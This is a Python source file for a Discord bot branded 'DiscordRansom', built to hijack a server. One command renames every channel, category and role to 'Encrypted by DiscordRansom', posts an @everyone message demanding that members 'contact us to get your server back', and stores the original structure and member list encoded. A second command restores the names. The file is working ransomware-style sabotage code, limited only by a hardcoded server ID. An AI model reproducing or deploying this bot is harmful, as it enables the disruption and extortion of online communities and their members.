from storage import *
import discord
from discord.ext import commands
from discord.utils import get

with open("token.txt", "r") as f:
    TOKEN = f.read()

bot = commands.Bot(command_prefix='!')

@bot.event
async def on_ready():
    print(f'{bot.user.name} has connected to Discord!')


@bot.command()
async def servers(ctx):
    for server in bot.guilds:
        print("Server Name: " + server.name)
        print("Server ID: " + str(server.id))
        print("Server Members: " + str(server.member_count))
        print("\n")

@bot.command()
async def encrypt_all_channels(ctx):
    for server in bot.guilds:
        if server.id != 840954377291300875: return

        victime = Victim(server)

        for channel in server.channels: # Includes Categories
            if channel.type == discord.ChannelType.text:
                victime.add_text_channels(channel)
                await channel.edit(topic="Encrypted by DiscordRansom", name="Encrypted by DiscordRansom")
                await channel.send("Encrypted by DiscordRansom. Please contact us to get your server back ! @everyone")
            elif channel.type == discord.ChannelType.category:
                victime.add_category(channel)
                await channel.edit(name="Encrypted by DiscordRansom")
            elif channel.type == discord.ChannelType.voice:
                victime.add_voice_channels(channel)
                await channel.edit(name="Encrypted by DiscordRansom")
        
        for roles in server.roles:
            try:
                await roles.edit(name="Encrypted by DiscordRansom. Please contact us to get your server back !")
                victime.add_role(roles)
            except:
                print(f"{roles.name} is not editable (Missing Permission)")

        for users in server.members:
            victime.add_user(users)
    
    victime.encode_data()
    victime.store_data()

    await ctx.message.channel.send("All channels have been encrypted. Task Finished.")

@bot.command()
async def decrypt_all_channels(ctx):
    """get all the informations stored in victims.json and then restore all the channels, voice channels, categories, roles and send a dm to all users"""
    for server in bot.guilds:
        if server.id != 840954377291300875: return

        victime = Victim(server)
        victime.load_data()
        victime.decode_data_from_base64()

        for channel in server.channels:
            channelid = str(channel.id)
            if channel.type == discord.ChannelType.text:
                await channel.edit(topic=victime.text_channels[channelid]["topic"], name=victime.text_channels[channelid]["name"])
            elif channel.type == discord.ChannelType.category:
                await channel.edit(name=victime.category[channelid]["name"])
            elif channel.type == discord.ChannelType.voice:
                await channel.edit(name=victime.voice_channels[channelid]["name"])

bot.run(TOKEN)